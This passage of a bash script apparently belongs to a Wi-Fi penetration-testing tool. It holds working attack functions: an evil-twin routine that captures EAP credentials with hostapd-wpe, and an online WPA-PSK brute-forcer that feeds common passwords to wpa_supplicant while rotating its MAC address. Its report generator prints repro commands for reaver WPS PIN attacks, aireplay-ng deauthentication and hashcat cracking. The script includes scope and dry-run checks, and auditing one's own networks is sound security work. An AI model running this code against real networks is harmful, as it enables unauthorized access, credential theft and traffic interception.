			printf 'server_cert=/etc/hostapd-wpe/certs/server.pem\n'
			printf 'private_key=/etc/hostapd-wpe/certs/server.pem\n'
			printf 'private_key_passwd=whatever\n'
			printf 'dh_file=/etc/hostapd-wpe/certs/dh\n'
			printf 'wpa=1\n'
			printf 'wpa_key_mgmt=WPA-EAP\n'
		} >"$conf" 2>/dev/null || true
		chmod 600 "$conf" 2>/dev/null || true
		timeout --kill-after=10 -- "$t" hostapd-wpe "$conf" >"$logf" 2>&1 || true
	fi

	cred_count=$(grep -icaE '(\[\*\][[:space:]]*)?(user|username|identity)[[:space:]]*[:=]' "$logf" 2>/dev/null) || cred_count=0
	cred_count=${cred_count//[!0-9]/}
	[[ -n "$cred_count" ]] || cred_count=0

	for f in ./hostapd-wpe.log ./eaphammer.log ./loot/*.creds ./loot/*.log; do
		[[ -f "$f" ]] || continue
		cp -f -- "$f" "$loot_dir/" 2>/dev/null || true
	done

	if ((cred_count > 0)); then
		proof="${logf##*/}"
		print_log VULN EVILTWIN "$b EAP creds"
		log_attempt "$b" "eviltwin_eap" "SUCCESS" "cred_sets=$cred_count tool=$tool proof=$proof"
		HITS=$((${HITS:-0} + 1))
		mark_known "$b" "EVILTWIN_EAP_CREDS"
		CREDS_FOUND+=("$b|${essid:-}|eviltwin-eap|EAP-hash x${cred_count}|see ${proof}")
		return 0
	fi

	log_attempt "$b" "eviltwin_eap" "FAIL" "no EAP credentials captured (tool=$tool; run 'eaphammer --cert-wizard' if cert missing)"
	return 1
}

function attack_wpa_psk_brute() {
	local b="$1" essid="${2:-}" channel="${3:-1}" akm="${4:-}"
	local ctrl_dir conf log pid pw ok=0 tried=0 maxn try_secs
	local -a words=()

	print_log INFO WPA2-BRUTE "Brute $b"
	log_attempt "$b" "wpa_brute" "START" "essid=${essid:-hidden} channel=$channel"

	if [[ "${ENABLE_WPA_BRUTE:-0}" != "1" ]]; then
		log_attempt "$b" "wpa_brute" "SKIP" "disabled"
		return 1
	fi
	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		log_attempt "$b" "wpa_brute" "SKIP" "dry-run"
		return 1
	fi
	if ! active_attack_permitted "$b"; then
		log_attempt "$b" "wpa_brute" "SKIP" "out of scope"
		return 1
	fi
	if is_wpa_enterprise "$akm"; then
		log_attempt "$b" "wpa_brute" "SKIP" "enterprise, not PSK"
		return 1
	fi
	if [[ -z "$essid" ]]; then
		log_attempt "$b" "wpa_brute" "SKIP" "hidden/empty ESSID"
		return 1
	fi
	if ! command -v wpa_supplicant &>/dev/null; then
		log_attempt "$b" "wpa_brute" "FAIL" "wpa_supplicant missing"
		return 1
	fi

	maxn="${WPA_BRUTE_MAX:-30}"
	try_secs="${WPA_BRUTE_TRY_SECS:-8}"

	
	if [[ -n "${WPA_BRUTE_WORDLIST:-}" && -r "${WPA_BRUTE_WORDLIST}" ]]; then
		mapfile -t words <"${WPA_BRUTE_WORDLIST}"
	else
		words=(12345678 123456789 1234567890 qwertyuiop 1q2w3e4r 987654321 \
			1q2w3e4r5t qazwsxedc 11111111 password 00000000 88888888 123456789a)
	fi

	if ! ensure_mode "managed"; then
		log_attempt "$b" "wpa_brute" "FAIL" "managed mode failed"
		return 1
	fi
	if [[ "${ENABLE_STEALTH_MAC:-0}" == "1" ]]; then
		stealth_mac_rotate 2>/dev/null || true
	fi

	ctrl_dir=$(mktemp -d "${TMP_DIR:-/tmp}/brute_XXXXXX") || {
		ensure_mode "managed" 2>/dev/null || true
		return 1
	}
	conf="${ctrl_dir}/wpa.conf"
	log="${ctrl_dir}/wpa.log"
	trap 'kill "$pid" 2>/dev/null || true; rm -rf "$ctrl_dir" 2>/dev/null || true; ensure_mode "managed" 2>/dev/null || true' RETURN

	for pw in ${words[@]+"${words[@]}"}; do
		pw="${pw%$'\r'}"
		[[ "${#pw}" -ge 8 && "${#pw}" -le 63 ]] || continue
		((tried >= maxn)) && break
		tried=$((tried + 1))
		cat >"$conf" <<EOF
ctrl_interface=$ctrl_dir
country=${REG_DOMAIN:-PL}
network={
    ssid="$essid"
    scan_ssid=1
    psk="$pw"
    key_mgmt=WPA-PSK
}
EOF
		: >"$log"
		timeout --kill-after=3 -- "$try_secs" \
			wpa_supplicant -i "$IFACE" -c "$conf" >"$log" 2>&1 &
		pid=$!

		local waited=0 hit=0
		while ((waited < try_secs)); do
			if grep -qE 'CTRL-EVENT-CONNECTED|WPA: Key negotiation completed' "$log" 2>/dev/null; then
				hit=1
				break
			fi
			if grep -qE '4-Way Handshake failed|pre-shared key may be incorrect|CTRL-EVENT-SSID-TEMP-DISABLED|WRONG_KEY' "$log" 2>/dev/null; then
				break
			fi
			sleep 1
			waited=$((waited + 1))
		done

		kill "$pid" 2>/dev/null || true
		wait "$pid" 2>/dev/null || true
		pid=""

		if ((hit == 1)); then
			print_log VULN HACKED "$b key found"
			save_proof "$b" "${CUR_CHIP:-unknown}" "" "$pw" "wpa_brute"
			HITS=$((${HITS:-0} + 1))
			ok=1
			break
		fi
	done

	if ((ok == 0)); then
		log_attempt "$b" "wpa_brute" "FAIL" "no PSK in $tried candidate(s)"
	fi
	return $((ok ? 0 : 1))
}

function dpp_sniff_monitor() {
	local bssid="${1:-}" channel="${2:-}"
	local capture_file capture_status=0 frame_count=0
	check_bssid "$bssid" || return 1
	[[ "$channel" =~ ^[0-9]+$ ]] && ((channel > 0)) || return 1
	command -v tcpdump &>/dev/null || {
		print_log WARN DPP "No tcpdump"
		return 1
	}
	[[ -d "${TMP_DIR:-}" ]] || return 1
	capture_file="${TMP_DIR}/dpp_${bssid//:/}_$(date +%s).pcap"

	ensure_mode "monitor" || return 1
	iface_set_channel "$channel" || {
		ensure_mode "managed" || true
		return 1
	}
	timeout "${DPP_SNIFF_SECS:-8}" tcpdump -i "$IFACE" -w "$capture_file" \
		'type mgt subtype action' 2>/dev/null || capture_status=$?
	ensure_mode "managed" || true

	if ((capture_status != 0 && capture_status != 124)); then
		print_log WARN DPP "Capture failed"
		log_attempt "$bssid" "dpp_sniff" "FAIL" "tcpdump exit=$capture_status"
		return 1
	fi

	if [[ -s "$capture_file" ]]; then
		frame_count=$(tcpdump -r "$capture_file" -nn 2>/dev/null | grep -iF "$bssid" | grep -c '50:6f:9a' || true)
	fi
	if ((frame_count > 0)); then
		print_log INFO DPP "$bssid DPP frames: $frame_count"
		log_attempt "$bssid" "dpp_sniff" "FOUND" "frames=$frame_count"
	else
		log_attempt "$bssid" "dpp_sniff" "NONE" "no DPP frames"
	fi
	return 0
}

function _sar_field() {
	local b="$1" k="$2" line="" out=""
	[[ -r "${LOG_DIR}/sar.jsonl" ]] || return 0
	line=$(grep -F "\"bssid\":\"$b\"" "${LOG_DIR}/sar.jsonl" 2>/dev/null | tail -n1) || true
	[[ -n "$line" ]] || return 0
	out=$(printf '%s' "$line" | grep -oE "\"$k\":\"[^\"]*\"" | head -n1 | sed -E "s/.*\"$k\":\"([^\"]*)\".*/\1/") || true
	printf '%s' "$out"
	return 0
}


function _band_from_ch() {
	local c="${1:-}"
	[[ "$c" =~ ^[0-9]+$ ]] || {
		printf '?'
		return 0
	}
	if ((c >= 1 && c <= 14)); then
		printf '2.4'
	elif ((c >= 32 && c <= 177)); then
		printf '5'
	else
		printf '?'
	fi
	return 0
}

function _html_escape() {
	local s="${1-}"
	s="${s//&/\&amp;}"
	s="${s//</\&lt;}"
	s="${s//>/\&gt;}"
	s="${s//\"/\&quot;}"
	printf '%s' "$s"
}

function _attempts_for() {
	local b="$1" line _m _st _d out=""
	local -A best=()
	for line in "${ATTEMPT_LOG[@]}"; do
		[[ "$line" == "$b|"* ]] || continue
		IFS='|' read -r _d _m _st _d <<<"$line"
		[[ -n "$_m" ]] || continue
		[[ "$_m" == "scope" || "$_m" == "dedupe" ]] && continue
		[[ "${best[$_m]:-}" == "SUCCESS" ]] && continue
		best[$_m]="$_st"
	done
	for _m in "${!best[@]}"; do out+="${_m}:${best[$_m]} "; done
	printf '%s' "${out% }"
}

function _wps_tried_rejected() {
	local b="${1:-}" want="${2:-}" line _b _m _st _d
	for line in "${ATTEMPT_LOG[@]}"; do
		[[ "$line" == "$b|"* ]] || continue
		IFS='|' read -r _b _m _st _d <<<"$line"
		[[ "|$want|" == *"|$_m|"* ]] || continue
		case "$_st" in
		REJECTED | SOFT_LOCK | LOCKED)
			return 0
			;;
		FAIL)
			case "$_d" in
			*"no reaver"* | *"mode switch"* | *"no valid candidates"* | *"invalid BSSID"* | *"invalid pin format"*) : ;;
			*) return 0 ;;
			esac
			;;
		esac
	done
	return 1
}


function _sha256_file() {
	local f="${1:-}"
	[[ -r "$f" ]] || return 0
	sha256sum -- "$f" 2>/dev/null | awk '{print $1}' || true
}

function _hsize() {
	local f="${1:-}" b=""
	[[ -f "$f" ]] || {
		printf '?'
		return 0
	}
	b=$(wc -c <"$f" 2>/dev/null | tr -d ' ') || b=""
	[[ "$b" =~ ^[0-9]+$ ]] || {
		printf '?'
		return 0
	}
	if ((b >= 1048576)); then
		printf '%d.%dMB' $((b / 1048576)) $(((b % 1048576) * 10 / 1048576))
	elif ((b >= 1024)); then
		printf '%dKB' $((b / 1024))
	else
		printf '%dB' "$b"
	fi
}

function _evtype_for() {
	case "${1:-}" in
	*isolation_*.conf) printf 'isolation posture' ;;
	*proof_*_wps_knownpin_*.conf) printf 'wps known-pin lead' ;;
	*proof_*_wps_open_*.conf) printf 'wps open lead' ;;
	*proof_*_pmf_off_*.conf) printf 'pmf-off proof' ;;
	*proof_*_nowpa3_*.conf) printf 'no-wpa3 proof' ;;
	*proof_*.conf) printf 'pin/psk crack proof' ;;
	*handshake_*.cap) printf '4 way handshake' ;;
	*pmkid_*.22000) printf 'pmkid hc22000' ;;
	*eapol_*.pcap) printf 'eapol capture' ;;
	*eviltwin*) printf 'evil twin log' ;;
	*) printf 'artifact' ;;
	esac
}

function _finding_meta() {
	case "${1:-}" in
	pixie) printf 'CRITICAL|wps pin popped with pixie dust (offline)|wps external registrar pin design flaw (US CERT VU#723755); pixie dust offline recovery (D. Bongard 2014), weak nonce on many Ralink Realtek Broadcom MediaTek chips|pixiewps on captured M1 M2 M3, or: reaver -i <mon> -b <BSSID> -c <CH> -K 1' ;;
	vendor) printf 'CRITICAL|wps pin popped, vendor default pin|factory default or vendor algo wps pin (from oui or serial, or a public default)|reaver -i <mon> -b <BSSID> -c <CH> -p <PIN>' ;;
	user_pin) printf 'HIGH|wps pin confirmed good|the ap took the pin we gave it|reaver -i <mon> -b <BSSID> -c <CH> -p <PIN>' ;;
	null) printf 'CRITICAL|wps takes a null pin|the ap takes the all zero wps pin with no real registrar|reaver -i <mon> -b <BSSID> -c <CH> -p 00000000' ;;
	empty) printf 'CRITICAL|wps takes an empty pin|the ap takes an empty wps pin value|reaver driving an empty pin exchange' ;;
	wpa_brute) printf 'CRITICAL|wpa2 key popped, offline handshake or pmkid crack|wpa2 4 way handshake or pmkid offline dictionary crack (hashcat mode 22000)|hashcat -m 22000 <capture.22000> <wordlist>' ;;
	pmkid) printf 'CRITICAL|wpa2 key popped, pmkid offline crack|pmkid captured clientless then cracked offline (hashcat mode 22000)|hashcat -m 22000 <pmkid.22000> <wordlist>' ;;
	handshake) printf 'CRITICAL|wpa2 key popped, 4 way handshake offline crack|4 way handshake captured then cracked offline (hashcat mode 22000)|hashcat -m 22000 <capture.22000> <wordlist>' ;;
	pmkid-tm) printf 'CRITICAL|wpa2 key popped on a wpa3 transition ap, pmkid offline crack|wpa3 transition ap still answers wpa2 psk; pmkid captured then cracked offline (Dragonblood transition downgrade)|hashcat -m 22000 <pmkid.22000> <wordlist>' ;;
	handshake-tm) printf 'CRITICAL|wpa2 key popped on a wpa3 transition ap, handshake offline crack|wpa3 transition ap still answers wpa2 psk; 4 way handshake captured then cracked offline (Dragonblood transition downgrade)|hashcat -m 22000 <capture.22000> <wordlist>' ;;
	defaultkey) printf 'CRITICAL|wpa2 factory default key recovered from bssid/essid keyspace|vendor default wpa2 psk derived from mac/essid, small deterministic keyspace, verified against the captured pmkid/handshake (USENIX WOOT 2015)|candidate list from routerkeygen/hcxpsktool; hashcat -m 22000 <capture.22000> <candidates>' ;;
	defaultkey-tm) printf 'CRITICAL|wpa2 factory default key recovered on a wpa3 transition ap|vendor default wpa2 psk (mac/essid keyspace) verified over the wpa2 path of a wpa3 transition ap (USENIX WOOT 2015)|candidate list from routerkeygen/hcxpsktool; hashcat -m 22000 <capture.22000> <candidates>' ;;
	*) printf 'HIGH|key grabbed (%s)|key material grabbed in this job|see attempt log' "${1:-unknown}" ;;
	esac
}

function _proof_for() {
	local b="${1:-}" _hd="${HASH_DIR:-$LOG_DIR}" bflat f latest=""
	bflat="${b//:/}"
	for f in "${_hd}"/proof_"${bflat}"_*.conf; do
		[[ -f "$f" ]] || continue
		grep -q '^# psk:' "$f" 2>/dev/null || continue
		latest="$f"
	done
	[[ -n "$latest" ]] || return 0
	local pin psk sha tm chip
	pin=$(grep -m1 '^# pin:' "$latest" 2>/dev/null | sed 's/^# pin:[[:space:]]*//') || pin=""
	psk=$(grep -m1 '^# psk:' "$latest" 2>/dev/null | sed 's/^# psk:[[:space:]]*//') || psk=""
	sha=$(grep -m1 '^# psk_sha:' "$latest" 2>/dev/null | sed 's/^# psk_sha:[[:space:]]*//') || sha=""
	tm=$(grep -m1 '^# time:' "$latest" 2>/dev/null | sed 's/^# time:[[:space:]]*//') || tm=""
	chip=$(grep -m1 '^# chip:' "$latest" 2>/dev/null | sed 's/^# chip:[[:space:]]*//') || chip=""
	printf '%s\t%s\t%s\t%s\t%s\t%s' "$latest" "$pin" "$psk" "$sha" "$tm" "$chip"
}

function _proof_live_verified() {
	local b="${1:-}" _hd="${HASH_DIR:-$LOG_DIR}" bflat f latest=""
	bflat="${b//:/}"
	for f in "${_hd}"/proof_"${bflat}"_*.conf; do
		[[ -f "$f" ]] || continue
		grep -q '^# psk:' "$f" 2>/dev/null || continue
		latest="$f"
	done
	[[ -n "$latest" ]] || return 0
	grep -m1 '^# live_verified:' "$latest" 2>/dev/null | sed 's/^# live_verified:[[:space:]]*//'
}

function _show_pin() {
	local pin="${1:-}"
	[[ -n "$pin" ]] || {
		printf '<empty>'
		return 0
	}
	if [[ "${REVEAL_CREDS:-0}" == "1" ]]; then printf '%s' "$pin"; else printf '****%s' "${pin: -2}"; fi
}
function _show_psk() {
	local psk="${1:-}"
	[[ -n "$psk" && "$psk" != "unknown" ]] || {
		printf '<not recovered>'
		return 0
	}
	if [[ "${REVEAL_CREDS:-0}" == "1" ]]; then printf '%s' "$psk"; else printf '<hidden: %d chars, check sha256>' "${#psk}"; fi
}
function _mask_psk() {
	local p="${1:-}" n
	[[ -n "$p" && "$p" != "unknown" ]] || {
		printf '<not recovered>'
		return 0
	}
	n=${#p}
	if ((n <= 4)); then
		printf '**** (%d chars)' "$n"
	else
		printf '%s****%s (%d chars, see proof file)' "${p:0:2}" "${p: -1}" "$n"
	fi
}

function _sev_color() {
	case "${1:-}" in
	CRITICAL) printf '#d92d20' ;;
	HIGH) printf '#e8750a' ;;
	MEDIUM) printf '#d9a406' ;;
	LOW) printf '#2563eb' ;;
	*) printf '#6b7280' ;;
	esac
}

function _sev_bg() {
	case "${1:-}" in
	CRITICAL) printf '#fef3f2' ;;
	HIGH) printf '#fff6ed' ;;
	MEDIUM) printf '#fffaeb' ;;
	LOW) printf '#eff4ff' ;;
	*) printf '#f3f4f6' ;;
	esac
}

function _sev_label() {
	case "${1:-}" in
	CRITICAL) printf 'Critical' ;;
	HIGH) printf 'High' ;;
	MEDIUM) printf 'Medium' ;;
	LOW) printf 'Low' ;;
	*) printf 'Info' ;;
	esac
}

function _state_badge() {
	case "${1:-}" in
	confirmed) printf '<span class="state" style="color:#b42318;background:#fef3f2">Confirmed</span>' ;;
	potential) printf '<span class="state" style="color:#b54708;background:#fff6ed">Potential</span>' ;;
	config) printf '<span class="state" style="color:#1849a9;background:#eff4ff">Config-based</span>' ;;
	beacon) printf '<span class="state" style="color:#1849a9;background:#eff4ff">Beacon-based</span>' ;;
	*) printf '<span class="state" style="color:#475467;background:#f3f4f6">Observation</span>' ;;
	esac
}

function _prio_badge() {
	local c
	case "${1:-}" in
	Immediate) c='#d92d20' ;;
	High) c='#e8750a' ;;
	"Short term") c='#d9a406' ;;
	Planned) c='#2563eb' ;;
	"Best practice") c='#15803d' ;;
	*) c='#6b7280' ;;
	esac
	printf '<span class="prio" style="color:%s;border-color:%s55">%s</span>' "$c" "$c" "$(_html_escape "${1:-}")"
}

function _fcard() {
	local sev="$1" fid="$2" title="$3" sk="$4" stext="$5" prio="$6" desc="$7" aff="$8" why="$9" imp="${10}" rec="${11}" verify="${12}" tech="${13}"
	local col bg
	col="$(_sev_color "$sev")"
	bg="$(_sev_bg "$sev")"
	printf '<article class="finding" style="--c:%s"><div class="f-head"><div class="f-id"><span class="pill" style="color:%s;background:%s;border-color:%s33">%s</span> <span class="f-code">%s</span></div><h3>%s</h3><div class="f-meta">%s %s</div></div>' \
		"$col" "$col" "$bg" "$col" "$(_sev_label "$sev")" "$fid" "$(_html_escape "$title")" "$(_state_badge "$sk")" "$(_prio_badge "$prio")"
	printf '<p class="f-desc">%s</p>' "$(_html_escape "$desc")"
	printf '<div class="f-grid"><div><div class="f-lab">Affected networks</div><ul class="tight">%s</ul></div><div><div class="f-lab">Why it matters</div><p>%s</p></div></div>' "$aff" "$(_html_escape "$why")"
	printf '<div class="f-grid"><div><div class="f-lab">What is confirmed</div><p>%s</p></div><div><div class="f-lab">Possible impact</div><ul class="tight">%s</ul></div></div>' "$(_html_escape "$stext")" "$imp"
	printf '<div class="f-rec"><div class="f-lab">Recommendation</div><p>%s</p><div class="f-lab" style="margin-top:8px">How to verify the fix</div><p>%s</p></div>' "$(_html_escape "$rec")" "$(_html_escape "$verify")"
	printf '<details class="f-tech" open><summary>Technical details</summary><ul class="mono tech">%s</ul></details></article>' "$tech"
}

function _li_esc() {
	local x out=""
	for x in "$@"; do out+="<li>$(_html_escape "$x")</li>"; done
	printf '%s' "$out"
}

function _iso_write_proof() {
	local b="${1:-}" e="${2:-}" km="${3:-}" pmf="${4:-}" enc="${5:-}"
	local _hd="${HASH_DIR:-$LOG_DIR}" bflat f
	[[ -n "$b" ]] || return 0
	bflat="${b//:/}"
	f="${_hd}/isolation_${bflat}_$(date +%s)_$$.conf"
	{
		printf '# CyclePatrol client isolation check (posture, not an executed exploit)\n'
		printf '# time: %s\n' "$(ts_now)"
		printf '# bssid: %s\n' "$b"
		printf '# essid: %s\n' "${e:-hidden}"
		printf '# key_model: %s\n' "${km:-psk}"
		printf '# pmf: %s\n' "${pmf:-unknown}"
		printf '# enc: %s\n' "${enc:-unknown}"
		printf '# assessment: if this net relies on client isolation, it can be bypassed (AirSnitch class)\n'
		printf '# note: the scanner cannot see from beacons whether client isolation is enabled, so this is posture, not a confirmed per net vuln\n'
		printf '# why: the group key (gtk) is shared by all clients on a bssid. one client can wrap a unicast packet in a gtk broadcast and reach an isolated peer. routing (gateway bounce) and switch learning (port steal) also cross the line. pmf does not stop this.\n'
		printf '# taxonomy: MITRE ATT&CK T1557 (adversary in the middle), T1040 (network sniffing); CWE 300; CWE 923\n'
		printf '# active_proof: needs two of your own clients on an isolated bench with the authors tool (github.com/vanhoefm/airsnitch). this scanner does not inject the frames.\n'
		printf '# ref: AirSnitch, NDSS 2026 (Vanhoef et al.); GovCERT.HK alert A26.03.06\n'
	} >"$f" 2>/dev/null || return 0
	chmod 600 "$f" 2>/dev/null || true
	printf '%s' "$f"
}

function _known_pins_for() {
	local b="${1:-}" oui
	oui="$(normalize_oui "$b" 2>/dev/null)" || oui=""
	[[ -n "$oui" ]] || return 0
	printf '%s' "${KNOWN_PINS_DB["$oui"]:-}"
}

function _write_finding_proof() {
	local b="${1:-}" e="${2:-}" kind="${3:-}"
	local _hd="${HASH_DIR:-$LOG_DIR}" bflat f
	[[ -n "$b" && -n "$kind" ]] || return 0
	bflat="${b//:/}"
	f="${_hd}/proof_${bflat}_${kind}_$(date +%s)_$$.conf"
	local ver wstate chip pmf praw cfgm dpid akm sig ch cand cn
	ver="$(_sar_field "$b" wps_ver)"
	wstate="$(_sar_field "$b" wps_state)"
	chip="$(_sar_field "$b" chip)"
	pmf="$(_sar_field "$b" pmf_mode)"
	praw="$(_sar_field "$b" pmf_raw)"
	cfgm="$(_sar_field "$b" config_methods)"
	dpid="$(_sar_field "$b" device_password_id)"
	akm="$(_sar_field "$b" akm_list)"
	sig="$(_sar_field "$b" signal)"
	ch="$(_sar_field "$b" channel)"
	{
		printf '# CyclePatrol finding proof (%s)\n' "$kind"
		printf '# time: %s\n' "$(ts_now)"
		printf '# bssid: %s\n' "$b"
		printf '# essid: %s\n' "${e:-hidden}"
		printf '# signal_dbm: %s\n' "${sig:-?}"
		printf '# channel: %s\n' "${ch:-?}"
		printf '# encryption_akm: %s\n' "${akm:-?}"
		printf '# wps_state: %s\n' "${wstate:-?}"
		printf '# wps_version: %s\n' "${ver:-?}"
		printf '# config_methods: %s\n' "${cfgm:-?}"
		printf '# device_password_id: %s\n' "${dpid:-?}"
		printf '# chipset: %s\n' "${chip:-unknown}"
		printf '# pmf_mode: %s\n' "${pmf:-?}"
		printf '# pmf_raw: %s\n' "${praw:-?}"
		case "$kind" in
		wps_knownpin)
			cand="$(_known_pins_for "$b")"
			local -a _cands=()
			IFS=' ' read -r -a _cands <<<"$cand"
			cn="${#_cands[@]}"
			printf '# candidate_default_pins: %s\n' "${cand:-none}"
			printf '# candidate_count: %s\n' "$cn"
			printf '# first_candidate_pin: %s\n' "${_cands[0]:-?}"
			printf '# severity: HIGH\n'
			printf '# assessment: wps external registrar is on. the published vendor default pin(s) were tried with reaver and the ap rejected them (see attempt log). wps is still on, so other pins or pixie dust may still work. lead, not a confirmed key.\n'
			printf '# repro: reaver -i <mon> -b %s -c %s -p %s\n' "$b" "${ch:-?}" "${_cands[0]:-<pin>}"
			printf '# ref: US CERT VU#723755; CWE-1392 use of default credentials; CWE-308\n'
			;;
		wps_open)
			printf '# severity: HIGH\n'
			printf '# assessment: wps external registrar is on (state=configured, pin method). pixie dust and/or the default pin were tried and the ap rejected them (see cp_audit.log). registrar stays exposed on weak chip families (ralink realtek broadcom mediatek). lead, not a confirmed key.\n'
			printf '# repro: reaver -i <mon> -b %s -c %s -K 1\n' "$b" "${ch:-?}"
			printf '# ref: US CERT VU#723755; pixie dust D. Bongard 2014\n'
			;;
		pmf_off)
			printf '# severity: MEDIUM\n'
			printf '# assessment: pmf 802.11w is not required (pmf required bit clear in rsn caps). mgmt frames are not protected, so deauth works. that assists 4 way handshake capture, denial of service, and coercion to an evil twin.\n'
			printf '# repro: aireplay-ng --deauth 1 -a %s <mon> then airodump-ng -c %s --bssid %s -w cap <mon>\n' "$b" "${ch:-?}" "$b"
			printf '# ref: IEEE 802.11w; MITRE ATT&CK T1557\n'
			;;
		nowpa3)
			printf '# severity: LOW\n'
			printf '# assessment: no wpa3 sae (akm has psk only). wpa2 psk is open to an offline dictionary crack on a grabbed handshake or pmkid.\n'
			printf '# repro: hashcat -m 22000 <capture.22000> <wordlist>\n'
			printf '# ref: hashcat mode 22000; CWE-326\n'
			;;
		esac
	} >"$f" 2>/dev/null || return 0
	chmod 600 "$f" 2>/dev/null || true
	printf '%s' "$f"
}

function make_report() {
	local stamp path_html rec b now_dot
	local essid sig ch band ver wstate pmf akm wpa3 maker dpid enc cves f tried chip
	local cb ce cm cp cs scope_lbl mode_lbl ev _hd
	local -A seen_ap=() cracked=()
	local -a fnd_sev=() fnd_ess=() fnd_bss=() fnd_title=() fnd_block=() fnd_type=()
	local -a as_sev=() as_name=() as_bss=() as_ch=() as_band=() as_sec=() as_res=() as_pin=()
	local -a wps_list=() wpsk_list=() pmf_list=() nowpa3_list=() cve_list=() iso_list=()
	local -a crit_bss=() crit_ess=() crit_meth=() crit_pin=() crit_psk=() crit_psha=() crit_proof=() crit_chip=() crit_ch=() crit_band=() crit_enc=()
	local n_ap=0 n_wps=0 n_pmfmiss=0 n_24=0 n_5=0
	local n_crit=0 n_high=0 n_med=0 n_low=0 n_info=0
	[[ -d "${LOG_DIR:-}" ]] || return 1
	stamp="$(date +%Y%m%d_%H%M%S)"
	now_dot="$(date +'%Y.%m.%d %H:%M:%S')"
	path_html="${LOG_DIR}/report_${stamp}_$$.html"
	_hd="${HASH_DIR:-$LOG_DIR}"

	scope_lbl="all (authorized)"
	[[ "${SCOPE_ALL_AUTHORIZED:-0}" != "1" && -n "${SCOPE_ESSID_PREFIX:-}" ]] && scope_lbl="essid ${SCOPE_ESSID_PREFIX}*"
	[[ "${SCOPE_ALL_AUTHORIZED:-0}" != "1" && -z "${SCOPE_ESSID_PREFIX:-}" ]] && scope_lbl="allowlist"
	mode_lbl="passive"
	[[ "${ENABLE_DEAUTH:-0}" == "1" || "${ENABLE_PMKID_ACTIVE:-0}" == "1" || "${ENABLE_EVILTWIN:-0}" == "1" ]] && mode_lbl="active"

	# Report dedup: scope the vulnerability report to NEW confirmed networks only
	# (BSSIDs never written to a previous report_*.html). With dedup off, behave
	# exactly as before. If no new confirmed remain, write no file at all.
	local -a _creds_use=()
	local -A _newset=()
	local _scope_new=0 _r _cb
	if [[ "${ENABLE_REPORT_DEDUP:-1}" == "1" ]]; then
		_scope_new=1
		for _r in "${CREDS_FOUND[@]}"; do
			_cb="${_r%%|*}"
			[[ -n "$_cb" ]] || continue
			if report_state_seen "${REPORT_STATE_VULN:-}" "$_cb"; then continue; fi
			_creds_use+=("$_r")
			_newset["$(report_state_norm "$_cb")"]=1
		done
		if ((${#_creds_use[@]} == 0)); then
			print_log INFO REPORT "skip: no new confirmed vulnerabilities"
			return 0
		fi
	else
		_creds_use=(${CREDS_FOUND[@]+"${CREDS_FOUND[@]}"})
	fi

	local meta sev title ref repro proof pf psha ptime pchip blk pin_v psk_v
	for rec in ${_creds_use[@]+"${_creds_use[@]}"}; do
		IFS='|' read -r cb ce cm cp cs <<<"$rec"
		[[ -n "$cb" ]] || continue
		cracked["$cb"]=1
		meta="$(_finding_meta "$cm")"
		IFS='|' read -r sev title ref repro <<<"$meta"
		pf=""
		psha=""
		ptime=""
		pchip=""
		pin_v="$cp"
		psk_v="$cs"
		proof="$(_proof_for "$cb")" || proof=""
		if [[ -n "$proof" ]]; then
			local _pp _ppin _ppsk
			IFS=$'\t' read -r pf _ppin _ppsk psha ptime pchip <<<"$proof"
			[[ -n "$_ppin" && -z "$pin_v" ]] && pin_v="$_ppin"
			[[ -n "$_ppsk" && ("$psk_v" == "" || "$psk_v" == "unknown") ]] && psk_v="$_ppsk"
		fi
		[[ -n "$ce" ]] || ce="$(_sar_field "$cb" essid)"
		[[ -n "$ce" ]] || ce="hidden"
		ch="$(_sar_field "$cb" channel)"
		band="$(_band_from_ch "$ch")"
		blk="target : ${ce} (${cb})  ch${ch:-?}/${band}G  chip=${pchip:-unknown}"
		blk+=$'\n'"class  : ${title}"
		blk+=$'\n'"ref    : ${ref}"
		blk+=$'\n'"loot   :"
		blk+=$'\n'"  wps pin    : $(_show_pin "$pin_v")"
		blk+=$'\n'"  wpa key    : $(_show_psk "$psk_v")"
		[[ -n "$psha" ]] && blk+=$'\n'"  key sha256 : ${psha}"
		blk+=$'\n'"  method     : ${cm}"
		[[ -n "$ptime" ]] && blk+=$'\n'"  got at     : ${ptime//-/.}"
		if [[ -n "$pf" ]]; then
			blk+=$'\n'"  proof file : ${pf##*/}  (sha256 $(_sha256_file "$pf" | sed 's/^$/unavailable/'))"
		fi
		blk+=$'\n'"how    : ${repro}"
		blk+=$'\n'"hit    : key in hand. attacker joins the wlan, reads client traffic, and moves to inside hosts. full loss of secrecy for this ssid."
		blk+=$'\n'"fix    : turn wps off; set a new psk of 20 plus random chars; move to wpa3 sae; put iot on its own vlan and ssid."
		blk+=$'\n'"check  : offline and stable result. anyone can redo it from the proof file and the sha256."
		fnd_sev+=("CRITICAL")
		fnd_ess+=("$ce")
		fnd_bss+=("$cb")
		fnd_title+=("$title")
		fnd_block+=("$blk")
		fnd_type+=("crit")
		local _ca _cenc
		_ca="$(_sar_field "$cb" akm_list)"
		_cenc="WPA2"
		[[ "$(_sar_field "$cb" wpa3)" == "YES" ]] && _cenc="WPA3"
		[[ "$_ca" == *802.1X* ]] && _cenc="ENT"
		crit_bss+=("$cb")
		crit_ess+=("$ce")
		crit_meth+=("$cm")
		crit_pin+=("$pin_v")
		crit_psk+=("$psk_v")
		crit_psha+=("$psha")
		crit_proof+=("${pf##*/}")
		crit_chip+=("${pchip:-unknown}")
		crit_ch+=("${ch:-?}")
		crit_band+=("$band")
		crit_enc+=("$_cenc")
		n_crit=$((n_crit + 1))
	done

	local km
	for rec in "${FOUND_TARGETS[@]}"; do
		b="${rec%%|*}"
		[[ -n "$b" ]] || continue
		[[ "$_scope_new" == 1 && -z "${_newset[$(report_state_norm "$b")]:-}" ]] && continue
		[[ -n "${seen_ap[$b]:-}" ]] && continue
		seen_ap[$b]=1
		essid="$(_sar_field "$b" essid)"
		[[ -n "$essid" ]] || essid="hidden"
		sig="$(_sar_field "$b" signal)"
		ch="$(_sar_field "$b" channel)"
		band="$(_band_from_ch "$ch")"
		ver="$(_sar_field "$b" wps_ver)"
		wstate="$(_sar_field "$b" wps_state)"
		chip="$(_sar_field "$b" chip)"
		pmf="$(_sar_field "$b" pmf_mode)"
		akm="$(_sar_field "$b" akm_list)"
		wpa3="$(_sar_field "$b" wpa3)"
		maker="$(_sar_field "$b" maker)"
		cves="$(_sar_field "$b" cves)"
		enc="WPA2"
		[[ "$wpa3" == "YES" ]] && enc="WPA3"
		[[ "$akm" == *SAE* && "$akm" == *PSK* ]] && enc="WPA2/3"
